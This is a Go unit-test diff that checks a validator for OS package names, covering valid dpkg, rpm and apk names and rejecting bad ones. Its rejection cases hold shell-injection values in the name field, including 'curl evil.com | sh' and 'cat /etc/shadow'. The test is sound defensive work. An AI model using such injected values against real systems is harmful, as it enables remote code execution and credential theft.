@@ -246,3 +246,96 @@ func TestGetUniqueLatestUpdates(t *testing.T) {
 		})
 	}
 }
+
+func TestValidateOSPackageNames(t *testing.T) {
+	tests := []struct {
+		name    string
+		updates unversioned.UpdatePackages
+		wantErr bool
+	}{
+		{
+			name: "valid dpkg package names",
+			updates: unversioned.UpdatePackages{
+				{Name: "libc6", FixedVersion: "2.31-13"},
+				{Name: "libssl1.1", FixedVersion: "1.1.1w-0+deb11u1"},
+				{Name: "zlib1g", FixedVersion: "1:1.2.11.dfsg-2+deb11u2"},
+			},
+			wantErr: false,
+		},
+		{
+			name: "valid rpm package names",
+			updates: unversioned.UpdatePackages{
+				{Name: "openssl-libs", FixedVersion: "1.1.1k-12.el8_9"},
+				{Name: "glibc", FixedVersion: "2.28-236.el8_9.12"},
+			},
+			wantErr: false,
+		},
+		{
+			name: "valid apk package names",
+			updates: unversioned.UpdatePackages{
+				{Name: "busybox", FixedVersion: "1.36.1-r15"},
+				{Name: "libcrypto3", FixedVersion: "3.1.4-r5"},
+			},
+			wantErr: false,
+		},
+		{
+			name:    "empty package name",
+			updates: unversioned.UpdatePackages{{Name: "", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "shell injection via semicolon",
+			updates: unversioned.UpdatePackages{{Name: "foo; curl evil.com | sh", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "shell injection via backtick",
+			updates: unversioned.UpdatePackages{{Name: "foo`whoami`", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "shell injection via dollar",
+			updates: unversioned.UpdatePackages{{Name: "foo$(id)", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "shell injection via pipe",
+			updates: unversioned.UpdatePackages{{Name: "foo|cat /etc/shadow", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "shell injection via ampersand",
+			updates: unversioned.UpdatePackages{{Name: "foo&&curl evil.com", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "package name too long",
+			updates: unversioned.UpdatePackages{{Name: strings.Repeat("a", 257), FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name:    "package name starting with hyphen",
+			updates: unversioned.UpdatePackages{{Name: "-badpkg", FixedVersion: "1.0"}},
+			wantErr: true,
+		},
+		{
+			name: "mixed valid and invalid rejects all",
+			updates: unversioned.UpdatePackages{
+				{Name: "valid-pkg", FixedVersion: "1.0"},
+				{Name: "bad;pkg", FixedVersion: "2.0"},
+			},
+			wantErr: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateOSPackageNames(tt.updates)
+			if tt.wantErr {
+				assert.Error(t, err)
+			} else {
+				assert.NoError(t, err)
+			}
+		})
+	}
+}
